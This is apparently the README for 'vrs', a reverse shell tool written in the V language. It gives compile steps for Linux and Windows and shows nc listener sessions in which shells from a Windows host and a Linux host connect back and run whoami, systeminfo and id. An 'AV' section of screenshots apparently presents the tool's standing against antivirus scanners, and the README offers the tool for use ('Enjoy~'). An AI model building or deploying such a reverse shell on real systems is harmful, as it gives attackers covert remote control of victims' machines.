
# vrs

portable v based reverse shell

https://vlang.io/

https://github.com/vlang/v#installing-v-from-source

**Compile**

must compile on target platform (at least for now, relatively new language)

```
root@kali:/opt/v# ./v vrs.v 
root@kali:/opt/v# file vrs
vrs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6aeb8728d17200150a78ea64d2db7c0accdddb2f, for GNU/Linux 3.2.0, not stripped
```

```
C:\Users\User\v>v.exe -os windows vrs.v
mingw not found, trying to build with msvc...

```

**Usage**

Windows
```
root@kali:/opt/v# nc -lvp 8080
listening on [any] 8080 ...
192.168.116.202: inverse host lookup failed: Unknown host
connect to [192.168.116.200] from (UNKNOWN) [192.168.116.202] 50780
whoami
windev1910eval\user

systeminfo

Host Name:                 WINDEV1910EVAL
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.18362 N/A Build 18362

```

Linux
```
root@kali:/opt/v# nc -lvp 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 37634
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

**AV**

<img width="1316" alt="Screenshot 2019-11-29 at 11 26 07" src="https://user-images.githubusercontent.com/56988989/69866129-2a789d80-129b-11ea-9fbf-a0398c21a83b.png">

<img width="534" alt="Screenshot 2019-11-29 at 11 23 17" src="https://user-images.githubusercontent.com/56988989/69866128-2a789d80-129b-11ea-8386-781e646f87eb.png">

Enjoy~

